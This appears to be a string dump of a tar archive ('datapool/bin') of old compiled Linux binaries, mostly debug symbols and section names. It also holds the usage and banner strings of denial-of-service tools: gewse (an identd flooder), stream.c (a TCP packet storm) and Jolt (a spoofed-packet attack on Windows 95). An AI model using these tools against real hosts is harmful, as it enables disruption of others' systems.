            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "gewse.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "numkill",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "portkill",
            "data_start",
            "printf@@GLIBC_2.0",
            "sockdesc",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/gewse5",
            "0100755",
            "0000000",
            "0000000",
            "00000034065",
            "07100656607",
            "013274",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "fflush",
            "write",
            "__deregister_frame_info",
            "rand",
            "fork",
            "srand",
            "time",
            "gethostbyname",
            "sprintf",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "f\u066d\u06dd\u066dP",
            "]U(E",
            "t$EP",
            "\u0403;u[]",
            "gewse.c by napster...",
            "usage: %s <host> <# of connex>",
            "Flooding %s identd %d times.",
            "Killing",
            "socket",
            "%d, 6667 : USERID : UNIX : die",
            "connect",
            "Aresolving",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "gewse5.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fork@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "reseed",
            "datapool/bin/stream",
            "0100755",
            "0000000",
            "0000000",
            "00000036342",
            "07100656701",
            "013363",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "getgid",
            "printf",
            "stdout",
            "random",
            "getpid",
            "perror",
            "getuid",
            "socket",
            "fflush",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "setgid",
            "sendto",
            "memset",
            "srand",
            "getppid",
            "time",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "setuid",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRht",
            "QVh|",
            "WVSU",
            "\u02c91fE",
            "E1fE",
            "fE1fEEE",
            "e[^_]",
            "WVSj(j",
            "e[^_]U",
            "P }\"h\t",
            "e[^]",
            "\u0403;u[]",
            "Usage: %s <dstaddr> <dstport> <pktsize> <pps>",
            "    dstaddr  - the target we are trying to attack.",
            "    dstport  - the port of the target, 0 = random.",
            "    pktsize  - the extra size to use.  0 = normal ",
            "syn.",
            "Could not resolve %s.",
            "jess",
            "stream.c v1.0 - TCP Packet Storm",
            "socket",
            "setsockopt",
            "Resolving IPs...",
            "Sending...",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "stream.c",
            "dstport",
            "lookup",
            "packet",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "sock",
            "cksum",
            "setgid@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "getppid@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "pktsize",
            "flooder",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "getuid@@GLIBC_2.0",
            "_fini",
            "s_in",
            "getgid@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "dstaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "setuid@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/jolt",
            "0100755",
            "0000000",
            "0000000",
            "00000034672",
            "07100657207",
            "013046",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u010c",
            "QVh@",
            "Shdd",
            "E;<~",
            "Lf\u01c5H",
            "ddfY",
            "hPEP }-DPhH",
            "\u0403;u[]",
            "Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)",
            "usage: %s <dstaddr> <saddr> [number]",
            "\tdstaddr is the host your attacking",
            "\tsaddr is the host your spoofing from",
            "\tNumber is the number of packets to send, 5 is the default",
            "NOTE:  This is based on a bug that used to affect POSIX complient, and SYSV ",
            "\t systems so its nothing new..",
            "Greets to Bill Gates! How do ya like this one? :-)",
            "socket",
            "IP_HDRINCL",
            "%s: unknown host",
            "Sending to %s",
            "offset %d: ",
            "sendto",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
